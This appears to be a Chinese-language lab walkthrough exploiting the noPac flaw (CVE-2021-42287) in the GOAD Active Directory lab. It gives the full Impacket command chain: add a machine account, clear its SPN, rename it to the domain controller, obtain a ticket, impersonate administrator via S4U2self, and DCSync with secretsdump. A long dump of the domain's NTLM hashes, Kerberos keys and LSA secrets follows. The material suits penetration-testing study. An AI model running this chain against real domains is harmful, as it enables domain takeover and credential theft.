# 0x05 Exploit with user 使用用户权限来渗透
MS14-068漏洞太老了 所以只尝试samccountname和printnightmare
## SamAccountName (nopac)
在 2021 年底，当每个人都在担心 log4j “log4shell” 漏洞时，另一个关注较少的漏洞出现了：CVE-2021-42287。
  * 查理·克拉克 (Charlie Clark) 在这里对此进行了精彩的描述： 
  * cube0x0 在 Windows 上自动进行了攻击： 
  * 由shutdown带来在linux上的攻击 :  (仍在impacket的PR中 :  and )
  * 作为 linux 和 exegol 的忠实粉丝，我们将尝试 linux 方式 :)
### 查看是否可以添加用户
在这里使用之前0x03中通过kerberoasting得到的用户`north/jon.snow:iknownothing`
找个cme模块查看机器账号配额
    cme ldap -L
    cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
(如果是docker启动的cme的话 记得在docker内也设置host的 直接通过ip无法连接ldpa
### 准备Impacket
因为linux版本的利用工具还没有合并到impacket的主分支中 需要进行如下操作
    git clone https://github.com/SecureAuthCorp/impacket myimpacket
    cd myimpacket
    git checkout -b mydev
    python3 -m virtualenv myimpacket # 可省略或者换成conda
    source myimpacket/bin/activate # 可省略或者换成conda
    python3 -m pip install .
获取我们想要的等待拉取请求（您可以在 exegol 安装脚本中找到大量好的 PR
合并：[https://github.com/ShutdownRepo/Exegol-images/blame/main/sources/install.sh#L286）](https://github.com/ShutdownRepo/Exegol-images/blame/main/sources/install.sh#L286%EF%BC%89)
    git fetch origin pull/1224/head:1224
    git fetch origin pull/1202/head:1202
    git merge 1202
    git merge 1224
重新排序路径输入结果以在 $PATH 中的其他路径之前加载我们的 pyenv bin（这在 zsh 上是必需的，在 bash 中它直接获取我们的 pyenv
bin）
    rehash
然后尝试如下命令 （ 其实不执行的话 直接pyhton examples应该也可以
    enameMachine.py
    getST.py
### 利用
我们要做的是添加一台计算机，清除那台计算机的SPN，重命名成与DC同名的计算机，为计算机获取一个TGT，将计算机名称重置为他原来的名字，使用我们之前获得的
TGT 获得服务票证，最后 dcsync
  * 添加计算机
    python addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
  * 清除我们新计算机的 SPN（使用 dirkjan的krbrelayx 工具 addspn）
    python addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
  * 重命名计算机(computer -> DC)
    python renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
  * 获取机器账号的TGT
    python getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
  * 恢复计算机名
    python renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
  * 利用之前获得的TGT票据，通过S4U2self协议向DC请求ST
> S4U2Self:
> 服务A通过S4U2Self协议，可以从域服务器获取账号B访问应用服务器A的TGS票据，就像账号B主动从域服务器获取一个访问服务A的TGS票据一样。可以理解为通过该协议，可以获取域内任意账号访问服务A的TGS票据，过程中不需要账号B认证到域
    export KRB5CCNAME=winterfell.ccache
    python getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
不显示debug是这样
  * 提供ST进行DCSync（卷影拷贝服务 读取ntds.dit）
    export KRB5CCNAME=PI:EMAIL@NORTH.SEVENKINGDOMS.LOCAL.ccache
    python secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
报错了
换到主分支
瞧，我们得到了所有north域的ntds.dit 信息 :)
  * result
        python secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
      Impacket v0.10.1.dev1+20221214.172823.8799a1a2 - Copyright 2022 Fortra
      [*] Target system bootKey: 0xb1f92c9b8265560f8b49f23cd869c9d6
      [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
      Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
      [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
      [*] Dumping cached domain logon information (domain/username:hash)
      [*] Dumping LSA Secrets
      [*] $MACHINE.ACC
      NORTH\WINTERFELL$:plain_password_hex:d170703bb5deb453a287f80eb6bda61423f4a36ccea8eb208470073f51d80af8452105dd48d1e8e783ea619b94609e6dcedc15d5a8c9d12ee70dd1388dbee37d061173a5a8e28989bbfb4705ca1a04e135da46a2efbba09a83e46646883ececa6f21477eaec72a4ed1bb37cb0a9766a158d73955b200cc1e9ee3cff3fa44e94112f3435d56874ebf6ef259b21abd37b286fa0312bd074fcde0e1aebdd689fc3a80bb4fd653c557eac3f833b9a624325d5c470995d49e9513b4d9d71aae920e0894d8fc6a21ed383c28c76d5b7fbe71d4faea6c76ef0add7dd056e543f4aa726c84d3051d1e7b0b76321aa3c9818c0204
      NORTH\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:d686382f13a5a4eba71875a9cc1c06fe:::
      [*] DPAPI_SYSTEM
      dpapi_machinekey:0xec326592813adf9d143643a6c2d5eb2599f6a111
      dpapi_userkey:0x5d88be06299c63fd38fc8f909bab5b03e4c9205c
      [*] NL$KM
       0000   22 34 01 76 01 70 30 93  88 A7 6B B2 87 43 59 69   "4.v.p0...k..CYi
       0010   0E 41 BD 22 0A 0C CC 23  3A 5B B6 74 CB 90 D6 35   .A."...#:[.t...5
       0020   14 CA D8 45 4A F0 DB 72  D5 CF 3B A1 ED 7F 3A 98   ...EJ..r..;...:.
       0030   CD 4D D6 36 6A 35 24 2D  A0 EB 0F 8E 3F 52 81 C9   .M.6j5$-....?R..
      NL$KM:223401760170309388a76bb2874359690e41bd220a0ccc233a5bb674cb90d63514cad8454af0db72d5cf3ba1ed7f3a98cd4dd6366a35242da0eb0f8e3f5281c9
      [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
      [*] Using the DRSUAPI method to get NTDS.DIT secrets
      Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
      krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d028fe975f3a670c2ed9e0ab63aaff9f:::
      vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
      arya.stark:1109:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
      eddard.stark:1110:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
      catelyn.stark:1111:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
      robb.stark:1112:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
      sansa.stark:1113:aad3b435b51404eeaad3b435b51404ee:835a6b6ea014fe35799fca41782b69c8:::
      brandon.stark:1114:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
      rickon.stark:1115:aad3b435b51404eeaad3b435b51404ee:1c0c10d5bc5ecd940fd491dcdcd67708:::
      hodor:1116:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
      jon.snow:1117:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
      samwell.tarly:1118:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
      jeor.mormont:1119:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
      sql_svc:1120:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
      WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:d686382f13a5a4eba71875a9cc1c06fe:::
      CASTELBLACK$:1121:aad3b435b51404eeaad3b435b51404ee:5e059d6d4202276079d511215299c96f:::
      samaccount$:1122:aad3b435b51404eeaad3b435b51404ee:0eddedc35eb7b7ecde0c9f0564e54c83:::
      SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:f47985c65a2bfd03e574550cc7db42e0:::
      [*] Kerberos keys grabbed
      Administrator:aes256-cts-hmac-sha1-96:e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972
      Administrator:aes128-cts-hmac-sha1-96:bb7b6aed58a7a395e0e674ac76c28aa0
      Administrator:des-cbc-md5:fe58cdcd13a43243
      krbtgt:aes256-cts-hmac-sha1-96:b02e4d5c54c680c75a5255502aa00d9c50b96014e05ddf10a5b4e0c5da7f9690
      krbtgt:aes128-cts-hmac-sha1-96:e3e371c8a119d787203352d6b161ebc7
      krbtgt:des-cbc-md5:ae04ef7c9115f10d
      vagrant:aes256-cts-hmac-sha1-96:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24
      vagrant:aes128-cts-hmac-sha1-96:0d7c6160ffb016857b9af96c44110ab1
      vagrant:des-cbc-md5:16dc9e8ad3dfc47f
      arya.stark:aes256-cts-hmac-sha1-96:2001e8fb3da02f3be6945b4cce16e6abdd304974615d6feca7d135d4009d4f7d
      arya.stark:aes128-cts-hmac-sha1-96:8477cba28e7d7cfe5338d172a23d74df
      arya.stark:des-cbc-md5:13525243d6643285
      eddard.stark:aes256-cts-hmac-sha1-96:f6b4d01107eb34c0ecb5f07d804fa9959dce6643f8e4688df17623b847ec7fc4
      eddard.stark:aes128-cts-hmac-sha1-96:5f9b06a24b90862367ec221a11f92203
      eddard.stark:des-cbc-md5:8067f7abecc7d346
      catelyn.stark:aes256-cts-hmac-sha1-96:c8302e270b04252251de40b2bd5fba37395b55d5ed9ac95e03213dc739827283
      catelyn.stark:aes128-cts-hmac-sha1-96:50ce7e2ad069fa40fb2bc7f5f9643d93
      catelyn.stark:des-cbc-md5:6b314670a2f84cfb
      robb.stark:aes256-cts-hmac-sha1-96:d7df5069178bbc93fdc34bbbcb8e374fd75c44d6ce51000f24688925cc4d9c2a
      robb.stark:aes128-cts-hmac-sha1-96:b2965905e68356d63fedd9904357cc42
      robb.stark:des-cbc-md5:c4b62c797f5dd01f
      sansa.stark:aes256-cts-hmac-sha1-96:3a8b01ee4c619572f32026d1c8b6caf94583d4461d910d0787f0c512a062f677
      sansa.stark:aes128-cts-hmac-sha1-96:d619611c01c73cf2fb92621791404646
      sansa.stark:des-cbc-md5:df75b098025d57d5
      brandon.stark:aes256-cts-hmac-sha1-96:6dd181186b68898376d3236662f8aeb8fa68e4b5880744034d293d18b6753b10
      brandon.stark:aes128-cts-hmac-sha1-96:9de3581a163bd056073b71ab23142d73
      brandon.stark:des-cbc-md5:76e61fda8a4f5245
      rickon.stark:aes256-cts-hmac-sha1-96:e70502b67982a59947e087bd6975f4626d04d48895eca85a679e09a15ab5800d
      rickon.stark:aes128-cts-hmac-sha1-96:1d0ebababa606386d91d72cd3ae27558
      rickon.stark:des-cbc-md5:daa7c23e498f3762
      hodor:aes256-cts-hmac-sha1-96:a33579ec769f3d6477a98e72102a7f8964f09a745c1191a705d8e1c3ab6e4287
      hodor:aes128-cts-hmac-sha1-96:929126dcca8c698230b5787e8f5a5b60
      hodor:des-cbc-md5:d5764373f2545dfd
      jon.snow:aes256-cts-hmac-sha1-96:5a1bc13364e758131f87a1f37d2f1b1fa8aa7a4be10e3fe5a69e80a5c4c408fb
      jon.snow:aes128-cts-hmac-sha1-96:d8bc99ccfebe2d6e97d15f147aa50e8b
      jon.snow:des-cbc-md5:084358ceb3290d7c
      samwell.tarly:aes256-cts-hmac-sha1-96:b66738c4d2391b0602871d0a5cd1f9add8ff6b91dcbb7bc325dc76986496c605
      samwell.tarly:aes128-cts-hmac-sha1-96:3943b4ac630b0294d5a4e8b940101fae
      samwell.tarly:des-cbc-md5:5efed0e0a45dd951
      jeor.mormont:aes256-cts-hmac-sha1-96:be10f893afa35457fcf61ecc40dc032399b7aee77c87bb71dd2fe91411d2bd50
      jeor.mormont:aes128-cts-hmac-sha1-96:1b0a98958e19d6092c8e8dc1d25c788b
      jeor.mormont:des-cbc-md5:1a68641a3e9bb6ea
      sql_svc:aes256-cts-hmac-sha1-96:24d57467625d5510d6acfddf776264db60a40c934fcf518eacd7916936b1d6af
      sql_svc:aes128-cts-hmac-sha1-96:01290f5b76c04e39fb2cb58330a22029
      sql_svc:des-cbc-md5:8645d5cd402f16c7
      WINTERFELL$:aes256-cts-hmac-sha1-96:aff0db5ad43fb7da4933d435d241956099ac81b08f232e5d29066a849468886c
      WINTERFELL$:aes128-cts-hmac-sha1-96:816154e6dac12c392951a147f1e5dd22
      WINTERFELL$:des-cbc-md5:7c525bce97238cab
      CASTELBLACK$:aes256-cts-hmac-sha1-96:d739b7e785a50da9a5b6c346e18e65a25c1da5d776d93c9c427118d2666d9c85
      CASTELBLACK$:aes128-cts-hmac-sha1-96:f7cff089f9e165ab49720481b5616d7c
      CASTELBLACK$:des-cbc-md5:7f381a3ba4fe434a
      samaccount$:aes256-cts-hmac-sha1-96:7b9a52e2d94aa24dcea3d181001b03380291929a0094fa5b24f44d2a221faa89